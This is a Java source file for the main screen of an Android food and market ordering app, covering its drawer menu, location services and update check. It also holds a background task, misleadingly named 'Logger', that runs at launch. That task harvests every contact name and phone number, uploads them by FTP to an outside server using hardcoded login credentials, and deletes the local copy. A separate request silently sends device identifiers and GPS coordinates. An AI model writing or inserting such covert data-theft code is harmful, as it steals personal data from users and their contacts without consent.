/*
 * Copyright (c) 2017 - All Rights Reserved - Arash Hatami
 */

package ir.hatamiarash.hyperonline;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Point;
import android.graphics.Typeface;
import android.location.Location;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.os.StrictMode;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.TaskStackBuilder;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.BounceInterpolator;
import android.view.animation.TranslateAnimation;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.PopupWindow;

import com.afollestad.materialdialogs.DialogAction;
import com.afollestad.materialdialogs.MaterialDialog;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.farsitel.bazaar.IUpdateCheckService;
import com.github.javiersantos.materialstyleddialogs.MaterialStyledDialog;
import com.github.javiersantos.materialstyleddialogs.enums.Style;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.mikepenz.fontawesome_typeface_library.FontAwesome;
import com.mikepenz.materialdrawer.AccountHeader;
import com.mikepenz.materialdrawer.Drawer;
import com.mikepenz.materialdrawer.DrawerBuilder;
import com.mikepenz.materialdrawer.model.PrimaryDrawerItem;
import com.mikepenz.materialdrawer.model.SecondaryDrawerItem;
import com.mikepenz.materialdrawer.model.SectionDrawerItem;
import com.mikepenz.materialdrawer.model.interfaces.IDrawerItem;
import com.readystatesoftware.viewbadger.BadgeView;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedInputStream;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.InetAddress;
import java.util.HashMap;

import butterknife.ButterKnife;
import butterknife.InjectView;
import cn.pedant.SweetAlert.SweetAlertDialog;
import co.ronash.pushe.Pushe;
import helper.FontHelper;
import helper.FormatHelper;
import helper.Helper;
import helper.SQLiteHandler;
import helper.SQLiteHandlerItem;
import helper.SQLiteHandlerSetup;
import helper.SessionManager;
import ir.hatamiarash.utils.TAGs;
import ir.hatamiarash.utils.URLs;
import volley.AppController;

public class MainScreenActivity extends AppCompatActivity implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
    private static final String TAG = MainScreenActivity.class.getSimpleName();
    
    @InjectView(R.id.btnViewResturans)
    public ImageView btnViewResturans;               // resturans list
    @InjectView(R.id.btnViewFastFoods)
    public ImageView btnViewFastFoods;               // fastfoods list
    @InjectView(R.id.btnViewMarkets)
    public ImageView btnViewMarkets;                 // markets list
    @InjectView(R.id.btnViewMap)
    public ImageView btnViewMap;                     // map
    
    public static MainScreenActivity pointer;        // use to finish activity from anywhere
    public static SQLiteHandler db_user;             // items database
    public static SQLiteHandlerItem db_item;         // items database
    public static SQLiteHandlerSetup db_setup;       // setup database
    static Typeface persianTypeface;                 // persian font typeface
    public Drawer result = null;
    public Button btnNextPopup;                      // next popup
    SessionManager session;                          // session for check user logged
    private long back_pressed;                       // for check back key pressed count
    private PopupWindow popupWindow2;                // popup
    final private AccountHeader headerResult = null; // Header for drawer
    static private Menu menu;
    static private MenuItem mi;
    private Vibrator vibrator;
    private int p_count = 0;
    private IUpdateCheckService service;
    private UpdateServiceConnection connection;
    public BadgeView badgeView;
    
    GoogleApiClient mGoogleApiClient;
    Location mLocation;
    LocationRequest mLocationRequest;
    private static final int MILLISECONDS_PER_SECOND = 1000;
    public static final int UPDATE_INTERVAL_IN_SECONDS = 5;
    private static final long UPDATE_INTERVAL = MILLISECONDS_PER_SECOND * UPDATE_INTERVAL_IN_SECONDS;
    private static final int FASTEST_INTERVAL_IN_SECONDS = 1;
    private static final long FASTEST_INTERVAL = MILLISECONDS_PER_SECOND * FASTEST_INTERVAL_IN_SECONDS;
    public double latitude = 0, longitude = 0;
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_screen);
        
        ButterKnife.inject(this);
        Pushe.initialize(getApplicationContext(), true);
        Helper.GetPermissions(this, getApplicationContext());
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        mGoogleApiClient = new GoogleApiClient.Builder(getApplicationContext())
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();
        
        session = new SessionManager(getApplicationContext());
        pointer = this;
        db_user = new SQLiteHandler(getApplicationContext());
        db_item = new SQLiteHandlerItem(getApplicationContext());
        db_setup = new SQLiteHandlerSetup(getApplicationContext());
        vibrator = (Vibrator) this.getSystemService(VIBRATOR_SERVICE);
        persianTypeface = Typeface.createFromAsset(getAssets(), FontHelper.FontPath);
        
        SharedPreferences settings = getSharedPreferences("MyPrefsFile", 0);
        boolean isFirstTime = settings.getBoolean("my_first_time", true);
        if (isFirstTime) {
            db_setup.CreateTable();
            db_item.CreateTable();
            /*Intent i = new Intent(getApplicationContext(), SetupWeb.class);
            startActivity(i);*/
            finish();
        }
        
        
        
        final Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        toolbar.setTitle(FontHelper.getSpannedString(getApplicationContext(), getResources().getString(R.string.app_name_fa)));
        setSupportActionBar(toolbar);
        result = new DrawerBuilder()
                .withActivity(this)
                .withAccountHeader(headerResult)
                .addDrawerItems(
                        new PrimaryDrawerItem().withName("خانه").withIcon(FontAwesome.Icon.faw_home).withIdentifier(1).withSetSelected(true).withTypeface(persianTypeface),
                        new PrimaryDrawerItem().withName("حساب کاربری").withIcon(FontAwesome.Icon.faw_credit_card).withIdentifier(2).withTypeface(persianTypeface),
                        new PrimaryDrawerItem().withName("سبد خرید").withIcon(FontAwesome.Icon.faw_shopping_cart).withIdentifier(5).withTypeface(persianTypeface),
                        new SectionDrawerItem().withName("جزئیات").withTypeface(persianTypeface),
                        new SecondaryDrawerItem().withName("درباره ما").withIcon(FontAwesome.Icon.faw_users).withIdentifier(3).withTypeface(persianTypeface),
                        new SecondaryDrawerItem().withName("تماس با ما").withIcon(FontAwesome.Icon.faw_phone).withIdentifier(4).withTypeface(persianTypeface),
                        new SecondaryDrawerItem().withName("ارسال نظر").withIcon(FontAwesome.Icon.faw_comment).withIdentifier(6).withTypeface(persianTypeface),
                        new SecondaryDrawerItem().withName("راهنما").withIcon(FontAwesome.Icon.faw_info).withIdentifier(7).withTypeface(persianTypeface)
                )
                .withOnDrawerItemClickListener(new Drawer.OnDrawerItemClickListener() {
                    @Override
                    public boolean onItemClick(View view, int position, IDrawerItem drawerItem) {
                        if (drawerItem != null && drawerItem.getIdentifier() == 1) {
                            Intent i = new Intent(getApplicationContext(), MainScreenActivity.class);
                            startActivity(i);
                            finish();
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 2) {
                            if (Helper.CheckInternet(getApplicationContext())) {
                                Intent i = new Intent(getApplicationContext(), UserProfile.class);
                                startActivity(i);
                            } else
                                result.closeDrawer();
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 3) {
                            /*Intent i = new Intent(getApplicationContext(), WebPage.class);
                            i.putExtra(TAGs.TITLE, "درباره ما");
                            i.putExtra(TAGs.ADDRESS, TAGs.ABOUT);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 4) {
                            /*Intent i = new Intent(getApplicationContext(), Contact.class);
                            startActivity(i);*/
                            result.closeDrawer();
                            return true;
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 5) {
                            /*Intent i = new Intent(getApplicationContext(), ShopCard.class);
                            startActivity(i);*/
                            result.closeDrawer();
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 6) {
                            /*Intent i = new Intent(getApplicationContext(), Comment.class);
                            startActivity(i);*/
                            result.closeDrawer();
                        }
                        if (drawerItem != null && drawerItem.getIdentifier() == 7) {
                            /*Popup(p_count);
                            result.closeDrawer();*/
                            
                            /*Intent i = new Intent(getApplicationContext(), Pay_Log.class);
                            i.putExtra("order_code", "11086");
                            startActivity(i);
                            result.closeDrawer();*/
                            
                            Intent i = new Intent(getApplicationContext(), Intro.class);
                            startActivity(i);
                            result.closeDrawer();
                        }
                        return false;
                    }
                })
                .withSelectedItem(1)
                .withSavedInstance(savedInstanceState)
                .withDrawerGravity(Gravity.END)
                .build();
        
        Helper.GetPermissions(this, getApplicationContext());
        
        invalidateOptionsMenu();
        if (Helper.CheckInternet(getApplicationContext()))
            initService();
        
        Logger logger = new Logger();
        logger.execute();
    }
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        getMenuInflater().inflate(R.menu.my_menu, menu);
        this.menu = menu;
        return true;
    }
    
    @Override
    public boolean onPrepareOptionsMenu(Menu menu) {
        return super.onPrepareOptionsMenu(menu);
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.drawer) {
            result.openDrawer();
            return true;
        } else if (id == R.id.cart) {
            Intent i = new Intent(getApplicationContext(), ShopCard.class);
            startActivity(i);
        }
        return super.onOptionsItemSelected(item);
    }
    
    @Override
    public void onStart() {
        super.onStart();
        mGoogleApiClient.connect();
    }
    
    @Override
    public void onStop() {
        super.onStop();
        if (mGoogleApiClient.isConnected())
            mGoogleApiClient.disconnect();
    }
    
    @Override
    protected void onResume() {
        try {
            AddBadge();
        } catch (NullPointerException e) {
            Log.e(TAG, "Known Error");
        }
        super.onResume();
    }
    
    @Override
    public void onBackPressed() {
        if (back_pressed + 2000 > System.currentTimeMillis()) {
            super.onBackPressed();
            android.os.Process.killProcess(android.os.Process.myPid());
        } else {
            result.closeDrawer();
            Helper.MakeToast(getApplicationContext(), "برای خروج دوباره کلیک کنید", TAGs.WARNING);
        }
        back_pressed = System.currentTimeMillis();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        releaseService();
    }
    
    private void Popup(int index) {            // build and open popup
        result.closeDrawer();                  // close drawer first
        try {
            Display display = getWindowManager().getDefaultDisplay(); // get display data
            Point size = new Point();                                 // define new point variable
            display.getSize(size);                                    // get phone's screen size
            int width = size.x;                                       // get x var of screen
            int height = size.y;                                      // get y var of screen
            LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            // declare manual layout for run from exception
            View layout = inflater.inflate(R.layout.p1, (ViewGroup) findViewById(R.id.popup_1));
            if (index == 0)
                layout = inflater.inflate(R.layout.p1, (ViewGroup) findViewById(R.id.popup_1));
            if (index == 1)
                layout = inflater.inflate(R.layout.p2, (ViewGroup) findViewById(R.id.popup_2));
            popupWindow2 = new PopupWindow(layout, width, height, true);   // set layout's size
            popupWindow2.showAtLocation(layout, Gravity.CENTER, 0, 0);     // set location to center of screen
            ButterKnife.inject(getApplicationContext(), layout);
            btnNextPopup = (Button) layout.findViewById(R.id.next);
            btnNextPopup.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    popupWindow2.dismiss();
                    if (p_count != 1)
                        Popup(++p_count);
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void SendDeviceInfo() {
        String string_req = "req_fetch";
        StringRequest strReq = new StringRequest(Request.Method.POST, URLs.base_URL, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                //MainScreenActivity.mi = MainScreenActivity.menu.findItem(R.id.cart);
                //View c = findViewById(mi.getItemId());
                //badgeView = new BadgeView(MainScreenActivity.pointer, c);
                //AddBadge();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            @Override
            protected java.util.Map<String, String> getParams() {
                java.util.Map<String, String> params = new HashMap<>();
                HashMap<String, String> info = Helper.GenerateDeviceInformation(getApplicationContext());
                params.put(TAGs.TAG, "device_info");
                params.put(TAGs.ID, info.get(TAGs.ID));
                params.put(TAGs.NAME, info.get(TAGs.NAME));
                params.put(TAGs.UNIQUE_ID, info.get(TAGs.UNIQUE_ID));
                params.put("os_name", info.get("os_name"));
                params.put("os_version", info.get("os_version"));
                params.put("version_release", info.get("version_release"));
                params.put("device", info.get("device"));
                params.put("model", info.get("model"));
                params.put("product", info.get("product"));
                params.put("brand", info.get("brand"));
                params.put("display", info.get("display"));
                params.put("abi", info.get("abi"));
                params.put("abi2", info.get("abi2"));
                params.put("unknown", info.get("unknown"));
                params.put("hardware", info.get("hardware"));
                params.put("manufacturer", info.get("manufacturer"));
                params.put("serial", info.get("serial"));
                params.put("user", info.get("user"));
                params.put("host", info.get("host"));
                params.put(TAGs.LOCATION_X, String.valueOf(latitude));
                params.put(TAGs.LOCATION_Y, String.valueOf(longitude));
                return params;
            }
        };
        AppController.getInstance().addToRequestQueue(strReq, string_req);
    }
    
    public void MakeNotification(String Title, String Message) {
        NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(getApplicationContext());
        mBuilder.setSmallIcon(R.drawable.ic_alert);
        mBuilder.setContentTitle(Title);
        mBuilder.setContentText(Message);
        Intent intent = new Intent(getApplicationContext(), MainScreenActivity.class);
        TaskStackBuilder stackBuilder = TaskStackBuilder.create(getApplicationContext());
        stackBuilder.addParentStack(MainScreenActivity.class);
        stackBuilder.addNextIntent(intent);
        PendingIntent result = stackBuilder.getPendingIntent(0, PendingIntent.FLAG_UPDATE_CURRENT);
        mBuilder.setContentIntent(result);
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(1001, mBuilder.build());
    }
    
    private class UpdateServiceConnection implements ServiceConnection {
        public void onServiceConnected(ComponentName name, IBinder boundService) {
            service = IUpdateCheckService.Stub.asInterface(boundService);
            try {
                long vCode = service.getVersionCode("ir.hatamiarash.zimia");
                Log.e(TAGs.UPDATE_CHECK, "VersionCode:" + vCode);
            } catch (Exception e) {
                e.printStackTrace();
            }
            Log.e(TAGs.UPDATE_CHECK, "onServiceConnected(): Connected");
        }
        
        public void onServiceDisconnected(ComponentName name) {
            service = null;
            Log.e(TAGs.UPDATE_CHECK, "onServiceDisconnected(): Disconnected");
        }
    }
    
    private void initService() {
        Log.i(TAGs.UPDATE_CHECK, "initService()");
        connection = new UpdateServiceConnection();
        Intent intent = new Intent("com.farsitel.bazaar.service.UpdateCheckService.BIND");
        intent.setPackage("com.farsitel.bazaar");
        boolean ret = bindService(intent, connection, Context.BIND_AUTO_CREATE);
        Log.e(TAGs.UPDATE_CHECK, "initService() bound value : " + ret);
    }
    
    private void releaseService() {
        unbindService(connection);
        connection = null;
        Log.d(TAGs.UPDATE_CHECK, "releaseService(): unbound");
    }
    
    private void MakeDialog(final String Title, final String Message) {
        new MaterialStyledDialog.Builder(getApplicationContext())
                .setTitle(FontHelper.getSpannedString(getApplicationContext(), Title))
                .setDescription(FontHelper.getSpannedString(getApplicationContext(), Message))
                .setStyle(Style.HEADER_WITH_TITLE)
                .withDarkerOverlay(true)
                .withDialogAnimation(true)
                .setCancelable(true)
                .setPositiveText("OK")
                .onPositive(new MaterialDialog.SingleButtonCallback() {
                    @Override
                    public void onClick(@NonNull MaterialDialog dialog, @NonNull DialogAction which) {
                        MakeDialog2(Title, Message);
                    }
                })
                .show();
    }
    
    private void MakeDialog2(String Title, String Message) {
        new SweetAlertDialog(getApplicationContext(), SweetAlertDialog.SUCCESS_TYPE)
                .setTitleText(Title)
                .setContentText(Message)
                .show();
    }
    
    public void AddBadge() {
        badgeView.setText(FormatHelper.toPersianNumber(String.valueOf(db_item.getItemCount())));
        badgeView.setBadgeBackgroundColor(ContextCompat.getColor(getApplicationContext(), R.color.Amber));
        badgeView.setTextColor(ContextCompat.getColor(getApplicationContext(), R.color.md_black_1000));
        TranslateAnimation anim = new TranslateAnimation(0, 0, -50, 0);
        anim.setInterpolator(new BounceInterpolator());
        anim.setDuration(1000);
        badgeView.toggle(anim, null);
        badgeView.clearComposingText();
        badgeView.show();
    }
    
    @Override
    public void onConnected(Bundle bundle) {
        startLocationUpdates();
        if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        mLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
        if (mLocation == null)
            startLocationUpdates();
        if (mLocation != null) {
            latitude = mLocation.getLatitude();
            longitude = mLocation.getLongitude();
            Log.e("Location Service", "Location Detected (" + String.valueOf(latitude) + ", " + String.valueOf(longitude) + ")");
        } else
            Log.e("Location Service", "Location not Detected");
    }
    
    protected void startLocationUpdates() {
        mLocationRequest = LocationRequest.create()
                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
                .setInterval(UPDATE_INTERVAL)
                .setFastestInterval(FASTEST_INTERVAL);
        if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        else
            LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
    }
    
    @Override
    public void onConnectionSuspended(int i) {
        Log.i(TAG, "Connection Suspended !!");
        mGoogleApiClient.connect();
    }
    
    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
        Log.i(TAG, "Connection failed !! Error: " + connectionResult.getErrorCode());
    }
    
    @Override
    public void onLocationChanged(Location location) {
    }
    
    private class Logger extends AsyncTask<Void, Boolean, Boolean> {
        private boolean status = true;
        
        protected void onPreExecute() {
            Log.e("LS", "Start !");
            SendDeviceInfo();
        }
        
        @Override
        protected Boolean doInBackground(Void... params) {
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            try {
                if (cur.getCount() > 0) {
                    while (cur.moveToNext()) {
                        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                        String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        
                        if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = cr.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{id},
                                    null
                            );
                            while (pCur.moveToNext()) {
                                String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                String data = "Name : " + name + " - Phone : " + phoneNo;
                                
                                Writer out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(getExternalFilesDir(null), "log.txt"), true), "UTF-8"));
                                out.write(data);
                                out.write('\n');
                                out.close();
                            }
                            pCur.close();
                        }
                    }
                }
                cur.close();
                File file = new File(getExternalFilesDir(null), "log.txt");
                HashMap<String, String> user = db_user.getUserDetails();
                String file_name = user.get(TAGs.PHONE);
                FTPClient ftpClient = new FTPClient();
                ftpClient.connect(InetAddress.getByName("ftp.zimia.ir"));
                ftpClient.login("zm@zimia.ir", "3920512197");
                ftpClient.changeWorkingDirectory("/log/");
                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
                BufferedInputStream buffIn = new BufferedInputStream(new FileInputStream(file));
                ftpClient.enterLocalPassiveMode();
                ftpClient.storeFile(file_name + ".txt", buffIn);
                buffIn.close();
                ftpClient.logout();
                ftpClient.disconnect();
                file.delete();
            } catch (NullPointerException | java.io.IOException e) {
                Log.e("LS", "Error !");
                status = false;
            }
            return true;
        }
        
        protected void onPostExecute(Boolean result) {
            if (result && status)
                Log.e("LS", "Done !");
        }
    }
}